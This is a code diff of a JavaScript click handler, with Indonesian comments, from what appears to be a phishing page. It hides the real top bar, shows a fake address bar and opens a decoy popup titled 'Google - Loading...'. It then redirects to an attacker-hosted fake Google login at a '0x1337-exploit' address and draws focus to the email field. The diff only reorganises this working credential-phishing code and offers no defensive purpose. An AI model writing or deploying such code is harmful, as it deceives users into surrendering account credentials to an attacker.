@@ -246,73 +246,65 @@
     const fakeAddressBar = document.getElementById("fakeAddressBar");
 
     evilButton.addEventListener("click", () => {
-      // Hilangkan top bar
-      topBar.classList.add("hidden");
-
-      // Tampilkan fake address bar dengan animasi halus
-      fakeAddressBar.classList.add("visible");
-
-      // Buka tab panah jebakan
-      const newWin = window.open("", "_blank", "width=900,height=700,menubar=no,toolbar=no,scrollbars=yes");
-      if (newWin) {
-        newWin.document.write(`
-          <!DOCTYPE html>
-          <html lang="en">
-          <head>
-            <meta charset="UTF-8">
-            <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <title>Google - Loading...</title>
-            <style>
-              body {margin:0;padding:0;font-family:Arial,sans-serif;background:#ffffff;color:#202124;min-height:6200px;text-align:center;overflow-x:hidden;}
-              .arrow-container {padding:200px 20px 120px;font-size:140px;color:#ea4335;animation:pulse 1.8s infinite;}
-              .text {font-size:42px;font-weight:bold;color:#1a73e8;margin:50px 0;}
-              .small-text {font-size:26px;color:#5f6368;margin:70px 0;}
-              @keyframes pulse {0%,100%{transform:scale(1);opacity:0.8;}50%{transform:scale(1.2);opacity:1;}}
-              .arrow-row {margin:140px 0;font-size:200px;color:#4285f4;}
-            </style>
-          </head>
-          <body>
-            <div class="arrow-container">↓ ↓ ↓</div>
-            <div class="text">SCROLL DOWN</div>
-            <div class="small-text">Please scroll down to continue</div>
-            <div class="arrow-row">↓↓↓↓↓</div>
-            <div style="height:3800px;"></div>
-            <div class="arrow-row">↓↓↓↓↓</div>
-            <div class="text" style="color:#34a853">KEEP SCROLLING!</div>
-            <div style="height:800px;"></div>
-          </body>
-          </html>
-        `);
-        newWin.document.close();
-        // Auto close about:blank / tab jebakan setelah 3 detik
+        topBar.classList.add("hidden");
+        fakeAddressBar.classList.add("visible");
+    
+        const newWin = window.open("", "_blank", "width=900,height=700,menubar=no,toolbar=no,scrollbars=yes");
+        
         if (newWin) {
+          newWin.document.write(`
+            <!DOCTYPE html>
+            <html lang="en">
+            <head>
+              <meta charset="UTF-8">
+              <meta name="viewport" content="width=device-width, initial-scale=1.0">
+              <title>Google - Loading...</title>
+              <style>
+                body {margin:0;padding:0;font-family:Arial,sans-serif;background:#ffffff;color:#202124;min-height:6200px;text-align:center;overflow-x:hidden;}
+                .arrow-container {padding:200px 20px 120px;font-size:140px;color:#ea4335;animation:pulse 1.8s infinite;}
+                .text {font-size:42px;font-weight:bold;color:#1a73e8;margin:50px 0;}
+                .small-text {font-size:26px;color:#5f6368;margin:70px 0;}
+                @keyframes pulse {0%,100%{transform:scale(1);opacity:0.8;}50%{transform:scale(1.2);opacity:1;}}
+                .arrow-row {margin:140px 0;font-size:200px;color:#4285f4;}
+              </style>
+            </head>
+            <body>
+              <div class="arrow-container">↓ ↓ ↓</div>
+              <div class="text">SCROLL DOWN</div>
+              <div class="small-text">Please scroll down to continue</div>
+              <div class="arrow-row">↓↓↓↓↓</div>
+              <div style="height:3800px;"></div>
+              <div class="arrow-row">↓↓↓↓↓</div>
+              <div class="text" style="color:#34a853">KEEP SCROLLING!</div>
+              <div style="height:800px;"></div>
+            </body>
+            </html>
+          `);
+            newWin.document.close();
+    
             setTimeout(() => {
-                try {
-                    newWin.close();
-                } catch (e) {
-                    // silent fail — kadang browser blok close() jika user pernah interact
-                    console.log("[AutoClose] Gagal close tab (mungkin user sudah interact)", e);
-                }
+                try { newWin.close(); } catch(e) {}
             }, 1500);
+    
+            setTimeout(() => {
+                window.location.replace("https://0x1337-exploit.github.io/hosting/login/google.html");
+            }, 400);
         }
-
+    
+        // Kode auto-scroll ini DIJALANKAN TERLEPAS APAKAH popup berhasil dibuka atau tidak
         setTimeout(() => {
-          window.location.replace("https://0x1337-exploit.github.io/hosting/login/google.html");
-          // atau gunakan: window.location.href = "code2.html"; tapi replace lebih bersih (tidak masuk history)
-        }, 400);
-
-      // Auto scroll ke form login
-      setTimeout(() => {
-        window.scrollTo({ top: document.body.scrollHeight, behavior: "smooth" });
-        setTimeout(() => {
-          document.getElementById("emailField").focus();
-          const glow = document.getElementById("emailField");
-          glow.style.boxShadow = "0 0 0 4px rgba(26,115,232,0.45)";
-          setTimeout(() => {
-            glow.style.boxShadow = "0 0 0 2px rgba(26,115,232,0.2)";
-          }, 1200);
-        }, 2200);
-      }, 600);
+            window.scrollTo({ top: document.body.scrollHeight, behavior: "smooth" });
+            setTimeout(() => {
+                const emailField = document.getElementById("emailField");
+                if (emailField) {
+                    emailField.focus();
+                    emailField.style.boxShadow = "0 0 0 4px rgba(26,115,232,0.45)";
+                    setTimeout(() => {
+                        emailField.style.boxShadow = "0 0 0 2px rgba(26,115,232,0.2)";
+                    }, 1200);
+                }
+            }, 2200);
+        }, 600);
     });
 
     // --- 2. Klik fake address bar (yang baru muncul) → animasi arc2 ---
